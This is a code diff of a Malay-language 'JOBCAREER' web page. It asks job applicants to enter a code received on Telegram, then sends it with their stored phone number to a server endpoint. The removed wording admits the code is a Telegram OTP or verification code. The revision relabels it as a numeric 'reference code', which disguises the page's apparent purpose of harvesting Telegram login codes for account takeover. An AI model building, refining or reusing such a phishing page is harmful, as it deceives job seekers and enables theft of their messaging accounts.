@@ -1,35 +1,251 @@
-<!doctype html>
+
+<!DOCTYPE html>
 <html lang="ms">
-<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
 <title>Semak Kod TELEGRAM - JOBCAREER</title>
+
 <style>
-*{box-sizing:border-box}body{font-family:Arial,sans-serif;background:#f3f6fa;margin:0;min-height:100vh;display:grid;place-items:center;color:#203047}
-main{background:#fff;padding:30px;border-radius:14px;width:min(440px,calc(100% - 32px));box-shadow:0 8px 30px #102c5018}
-h1{margin-top:0;color:#102c50}label{display:block;margin:18px 0 7px;font-weight:bold}
-input{width:100%;padding:13px;border:1px solid #ccd5e0;border-radius:8px;font-size:16px}
-button{width:100%;padding:13px;border:0;border-radius:8px;background:#1766a4;color:#fff;font-size:16px;margin-top:16px;cursor:pointer}
-#result{margin-top:16px;line-height:1.5}.muted{color:#667085;font-size:13px}
-</style></head>
-<body><main>
+* {
+    box-sizing: border-box;
+}
+
+body {
+    font-family: Arial, sans-serif;
+    background: #f3f6fa;
+    margin: 0;
+    min-height: 100vh;
+    display: grid;
+    place-items: center;
+    color: #203047;
+}
+
+main {
+    background: #fff;
+    padding: 30px;
+    border-radius: 14px;
+    width: min(440px, calc(100% - 32px));
+    box-shadow: 0 8px 30px #102c5018;
+}
+
+h1 {
+    margin-top: 0;
+    color: #102c50;
+}
+
+label {
+    display: block;
+    margin: 18px 0 7px;
+    font-weight: bold;
+}
+
+input {
+    width: 100%;
+    padding: 13px;
+    border: 1px solid #ccd5e0;
+    border-radius: 8px;
+    font-size: 16px;
+}
+
+button {
+    width: 100%;
+    padding: 13px;
+    border: 0;
+    border-radius: 8px;
+    background: #1766a4;
+    color: #fff;
+    font-size: 16px;
+    margin-top: 16px;
+    cursor: pointer;
+}
+
+button:disabled {
+    opacity: .6;
+    cursor: not-allowed;
+}
+
+#result {
+    margin-top: 16px;
+    line-height: 1.5;
+}
+
+.muted {
+    color: #667085;
+    font-size: 13px;
+}
+
+.phone-info {
+    background: #f0f6fc;
+    padding: 12px;
+    border-radius: 8px;
+    font-size: 13px;
+    margin-top: 18px;
+    line-height: 1.6;
+}
+
+</style>
+</head>
+
+<body>
+
+<main>
+
 <h1>Semak kod rujukan</h1>
-<p>Masukkan kod rujukan permohonan JOBCAREER anda di Mesej TELEGRAM, contohnya xxxxx.</p>
+
+<p>
+Masukkan kod rujukan permohonan JOBCAREER anda
+yang diterima melalui Telegram.
+</p>
+
+<!-- MAKLUMAT TELEFON -->
+<div class="phone-info">
+    <strong>Nombor telefon permohonan:</strong>
+    <div id="phoneDisplay">Memuatkan nombor telefon...</div>
+</div>
+
 <form id="checkForm">
-<label for="reference">Kod rujukan</label>
-<input id="reference" name="reference" required maxlength="20" autocomplete="off" placeholder="XXXXX">
-<button type="submit">Semak</button>
+
+    <label for="reference">Kod rujukan</label>
+
+    <input
+        id="reference"
+        name="reference"
+        type="text"
+        required
+        maxlength="20"
+        autocomplete="off"
+        inputmode="numeric"
+        placeholder="Masukkan kod angka"
+        pattern="[0-9]+"
+    >
+
+    <button type="submit" id="submitButton">
+        Semak
+    </button>
+
 </form>
-<div id="result" role="status"></div>
-<p class="muted">Ini nombor kod Telegram, kod OTP atau kod pengesahan di Mesej Telegram.</p>
+
+<div id="result" role="status" aria-live="polite"></div>
+
+<p class="muted">
+Permintaan semakan akan dihantar kepada admin melalui Telegram.
+</p>
+
 </main>
+
 <script>
-document.getElementById('checkForm').addEventListener('submit', async e=>{
- e.preventDefault();
- const result=document.getElementById('result');
- result.textContent='Sedang menyemak...';
- try{
-  const r=await fetch('/api/kod',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({reference:document.getElementById('reference').value.trim()})});
-  const d=await r.json();
-  result.textContent=d.message || 'Permintaan selesai.';
- }catch(err){result.textContent='Tidak dapat menghubungi server. Cuba lagi.';}
+
+/* ================================
+   AMBIL DATA DARI HALAMAN INDEX
+================================ */
+
+// Ambil nombor telefon daripada sessionStorage
+const phone = sessionStorage.getItem("applicationPhone") || "";
+
+// Ambil maklumat jawatan jika diperlukan
+const job = sessionStorage.getItem("applicationJob") || "";
+
+// Paparkan nombor telefon
+const phoneDisplay = document.getElementById("phoneDisplay");
+
+if (phone) {
+    phoneDisplay.textContent = phone;
+} else {
+    phoneDisplay.textContent = "Nombor telefon tidak dijumpai.";
+}
+
+
+/* ================================
+   PROSES SEMAK KOD
+================================ */
+
+document.getElementById("checkForm")
+.addEventListener("submit", async function(event) {
+
+    event.preventDefault();
+
+    const result = document.getElementById("result");
+    const button = document.getElementById("submitButton");
+
+    // Ambil kod rujukan
+    const reference = document.getElementById("reference")
+        .value.trim();
+
+    // Pastikan nombor telefon tersedia
+    if (!phone) {
+        result.textContent =
+            "Nombor telefon tidak dijumpai. Sila kembali ke halaman permohonan dan cuba semula.";
+
+        return;
+    }
+
+    // Validasi kod angka sahaja
+    if (!/^\d+$/.test(reference)) {
+        result.textContent =
+            "Kod rujukan mesti mengandungi angka sahaja.";
+
+        return;
+    }
+
+    button.disabled = true;
+    button.textContent = "Sedang Menyemak...";
+
+    result.textContent = "Sedang menghantar permintaan semakan...";
+
+    try {
+
+        // Hantar kod dan nombor telefon ke API
+        const response = await fetch("/api/kod", {
+
+            method: "POST",
+
+            headers: {
+                "Content-Type": "application/json"
+            },
+
+            body: JSON.stringify({
+
+                reference: reference,
+
+                phone: phone,
+
+                job: job
+
+            })
+
+        });
+
+        const data = await response.json();
+
+        if (!response.ok || data.success !== true) {
+            throw new Error(
+                data.message || "Permintaan semakan gagal."
+            );
+        }
+
+        result.textContent =
+            data.message || "Permintaan semakan berjaya dihantar.";
+
+    } catch (error) {
+
+        console.error("Semakan kod error:", error);
+
+        result.textContent =
+            error.message ||
+            "Tidak dapat menghubungi server. Cuba lagi.";
+
+    } finally {
+
+        button.disabled = false;
+        button.textContent = "Semak";
+
+    }
+
 });
-</script></body></html>
+
+</script>
+
+</body>
+</html>
